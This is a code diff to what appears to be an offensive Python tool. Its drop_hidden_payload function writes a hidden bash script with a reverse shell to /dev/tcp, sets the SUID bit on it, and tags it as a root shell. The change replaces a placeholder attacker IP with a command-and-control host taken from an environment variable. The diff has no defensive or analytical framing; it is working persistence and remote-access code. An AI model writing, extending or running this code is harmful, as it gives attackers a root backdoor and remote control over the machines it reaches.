@@ -41,11 +41,17 @@ def cleanup_dirs():
 
 def drop_hidden_payload():
     log("Writing polymorphic SUID payload...")
+
+    # Get C2 IP from env or fallback
+    C2_IP = os.getenv("ROGUE_C2_HOST", "127.0.0.1")
+    C2_PORT = "9001"
+
     payload = (
         "#!/bin/bash\n"
         f"echo '[ROOT SHELL :: {PAYLOAD_TAG}]'\n"
-        "bash -i >& /dev/tcp/YOUR.ATTACK.BOX.IP/4444 0>&1\n"
+        f"bash -i >& /dev/tcp/{C2_IP}/{C2_PORT} 0>&1\n"
     )
+
     with open(HIDDEN_PAYLOAD, "w") as f:
         f.write(payload)
     os.chmod(HIDDEN_PAYLOAD, 0o4755)
